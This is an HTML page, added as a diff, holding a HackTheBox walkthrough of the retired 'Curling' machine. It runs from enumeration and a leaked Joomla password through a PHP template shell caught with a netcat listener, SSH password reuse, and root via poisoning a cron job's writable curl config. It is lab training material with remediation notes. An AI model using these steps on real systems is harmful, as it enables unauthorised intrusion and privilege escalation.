@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Curling: Joomla secret to shell, writable curl config to root — Lucky Thandel</title>
+<meta name="description" content="secret.txt hands over the Joomla admin password, a template edit becomes a shell, and a root cron trusting a writable curl config ends it. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-24 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Curling: Joomla secret to shell, writable curl config to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Curling is a retired HackTheBox easy Linux machine rewarding reading files other people ignore. Synopsis: a secret.txt hands over the Joomla admin password, a template edit becomes a shell, and a root cron trusting a writable curl config ends it.</p>
+<h2><span class="amber">$</span> Enumeration — files before exploits</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: fuzz and read secret.txt</span>
+nmap -sC -sV -oN curling.nmap 10.10.10.150
+gobuster dir -u http://10.10.10.150 -w common.txt   # -&gt; secret.txt
+curl -s http://10.10.10.150/secret.txt</pre>
+<p>A stray file in the web root contains the administrator password. Stray files are credentials until proven otherwise: try the secret against the Joomla admin login and you are in as Super User.</p>
+<h2><span class="amber">$</span> Foothold — template to shell</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: template edit plus listener</span>
+# Joomla admin -&gt; Templates -&gt; edit active template -&gt; insert PHP system() payload
+# browse the template page to trigger
+nc -lvnp 4444   # www-data</pre>
+<p>A Joomla Super User can edit templates, and template fields execute PHP. Insert the payload, browse the page, catch the callback.</p>
+<h2><span class="amber">$</span> Lateral move — password reuse</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: same secret, SSH floris</span>
+ssh floris@10.10.10.150   # same password as the Joomla secret</pre>
+<p>One password, two identities — password reuse strikes again, and now you have an interactive shell with a home directory to enumerate.</p>
+<h2><span class="amber">$</span> Privilege escalation — writable curl config in root cron</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: poison the cron config</span>
+cat /etc/crontab   # root runs: curl -K &lt;floris-writable-config&gt;
+ls -l ~/admin-area/input   # writable!
+# append an --output directive redirecting to a sensitive path / payload drop:
+echo &quot;--output /etc/cron.d/pwn&quot; &gt;&gt; ~/admin-area/input   # wait for the tick
+id   # uid=0(root)</pre>
+<p>A root cronjob fetches a URL using a curl config file (-K) that lives in floris-writable space. curl configs accept --output directives — redirect one to a sensitive file and the schedule does the rest. Schedules trusting user-writable input are root by appointment. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Attacking Joomla extensions for CVEs first (the secret file is the intended door) and cracking hashes before trying reuse.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Keep secrets out of web roots, forbid template editing in production, enforce unique credentials, and never let privileged automation consume user-writable config. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
